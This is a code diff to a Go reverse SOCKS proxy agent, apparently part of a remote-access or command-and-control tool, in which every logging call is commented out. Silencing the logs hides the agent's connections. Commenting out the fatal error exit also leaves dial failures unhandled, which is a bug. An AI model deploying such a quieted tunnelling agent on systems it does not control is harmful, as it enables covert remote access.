@@ -22,7 +22,7 @@ var (
 )
 
 func ReverseSocksAgent[T any](serverAddress, psk string, useTLS bool, conn T, sendFunc func([]byte, T), TunnelPort, Socks5Port, HPID, UserName, Password string) {
-	log.Println("Connecting to socks server at " + serverAddress)
+	//log.Println("Connecting to socks server at " + serverAddress)
 
 	var dialConn net.Conn
 	var err error
@@ -34,9 +34,9 @@ func ReverseSocksAgent[T any](serverAddress, psk string, useTLS bool, conn T, se
 	}
 
 	if err != nil {
-		log.Fatalln(err.Error())
+		//log.Fatalln(err.Error())
 	}
-	log.Println("Connected")
+	//log.Println("Connected")
 
 	msgpack := new(MessagePack.MsgPack)
 	msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")
@@ -58,12 +58,12 @@ func ReverseSocksAgent[T any](serverAddress, psk string, useTLS bool, conn T, se
 	for {
 		stream, err := session.AcceptStream()
 		if err != nil {
-			log.Println(err.Error())
+			//log.Println(err.Error())
 			break
 		}
 		go func() {
 			if err := ServeConn(stream); err != nil && err != mux.ErrPeerClosedStream {
-				log.Println(err.Error())
+				//log.Println(err.Error())
 			}
 		}()
 	}
@@ -73,7 +73,7 @@ func ReverseSocksAgent[T any](serverAddress, psk string, useTLS bool, conn T, se
 
 // Accepts connections and tunnels the traffic to the SOCKS server running on the client.
 func TunnelServer(listenAddress, username, password string, session *mux.Mux) {
-	log.Println("Listening for socks clients on " + listenAddress)
+	//log.Println("Listening for socks clients on " + listenAddress)
 
 	ln, err := net.Listen("tcp", listenAddress)
 	if err != nil {
@@ -140,7 +140,7 @@ func handleSocksClient(conn net.Conn, stream net.Conn, authMethod Authenticator)
 	defer stream.Close()
 
 	if err := doauth(conn, authMethod); err != nil {
-		log.Printf("failed to authenticate: %v", err.Error())
+		//log.Printf("failed to authenticate: %v", err.Error())
 		return
 	}
 
